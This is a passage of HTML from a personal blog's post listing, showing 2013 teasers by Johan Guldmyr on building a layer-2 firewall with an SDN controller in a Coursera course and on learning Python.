                </div><!-- /.entry-content -->
            </article></li>

            <li><article class="hentry">
                <header>
                    <h1><a href="/make-your-own-l2-firewall.html" rel="bookmark"
                           title="Permalink to "Make your own L2 Firewall!"">"Make your own L2 Firewall!"</a></h1>
                </header>

                <div class="entry-content">
<footer class="post-info">
        <abbr class="published" title="2013-07-17T00:00:00+03:00">
                Published: "2013-07-17"
        </abbr>

        <address class="vcard author">
                By                         <a class="url fn" href="/author/johan-guldmyr.html">Johan Guldmyr</a>
        </address>
<p>In <a href="/category/it.html">it</a>.</p>
<p>tags: <a href="/tag/coursera.html">coursera</a> <a href="/tag/firewall.html">firewall</a> <a href="/tag/learning.html">learning</a> <a href="/tag/linux.html">linux</a> <a href="/tag/pox.html">pox</a> <a href="/tag/python.html">python</a> <a href="/tag/sdn.html">sdn</a> <a href="/tag/software.html">software</a> <a href="/tag/defined.html">defined</a> <a href="/tag/networking.html">networking</a> <a href="/tag/studying.html">studying</a> </p>
</footer><!-- /.post-info -->                <p>Is what I did this week during the <a href="https://www.coursera.org/course/sdn" title="https://www.coursera.org/course/sdn">SDN Course</a> on Coursera :)</p>
<p>Within <a href="http://mininet.org/" title="http://mininet.org/">mininet</a> or with a real OpenFlow capable switch, you can point the switch to use a controller. The controller would figure out all the smart stuff and the switch only does what the controller tells it to …</p>
                <a class="readmore" href="/make-your-own-l2-firewall.html">read more</a>
                </div><!-- /.entry-content -->
            </article></li>

            <li><article class="hentry">
                <header>
                    <h1><a href="/pythons.html" rel="bookmark"
                           title="Permalink to "Pythons"">"Pythons"</a></h1>
                </header>

                <div class="entry-content">
<footer class="post-info">
        <abbr class="published" title="2013-01-14T00:00:00+02:00">
                Published: "2013-01-14"
        </abbr>

        <address class="vcard author">
                By                         <a class="url fn" href="/author/johan-guldmyr.html">Johan Guldmyr</a>
        </address>
<p>In <a href="/category/it.html">it</a>.</p>
<p>tags: <a href="/tag/programming.html">programming</a> <a href="/tag/python.html">python</a> <a href="/tag/studying.html">studying</a> </p>
</footer><!-- /.post-info -->                <p>Ever thought about studying a bit of programming? Thought it was a too daunting task?</p>
<p>I've just gone through the second lesson on <a href="http://www.learnstreet.com/" title=".com">learnstreet</a> and it's quite fun! It doesn't take long to go through the first two lessons, so if you don't have much time you can spend a …</p>
                <a class="readmore" href="/pythons.html">read more</a>
                </div><!-- /.entry-content -->
            </article></li>
                </ol><!-- /#posts-list -->
                </section><!-- /#content -->
        <section id="extras" class="body">
                <div class="blogroll">
                        <h2>links</h2>
                        <ul>
                            <li><a href="https://wtangy.se">Was There an NHL Game Yesterday?</a></li>
                        </ul>
                </div><!-- /.blogroll -->
                <div class="social">
                        <h2>social</h2>
                        <ul>
                            <li><a href="/atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>

                            <li><a href="https://twitter.com/martbhell">martbhell</a></li>
                        </ul>
                </div><!-- /.social -->
        </section><!-- /#extras -->

        <footer id="contentinfo" class="body">
                <address id="about" class="vcard body">
                Proudly powered by <a href="https://getpelican.com/">Pelican</a>, which takes great advantage of <a href="https://www.python.org/">Python</a>.
                </address><!-- /#about -->

                <p>The theme is by <a href="https://www.smashingmagazine.com/2009/08/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
        </footer><!-- /#contentinfo -->

</body>
</html>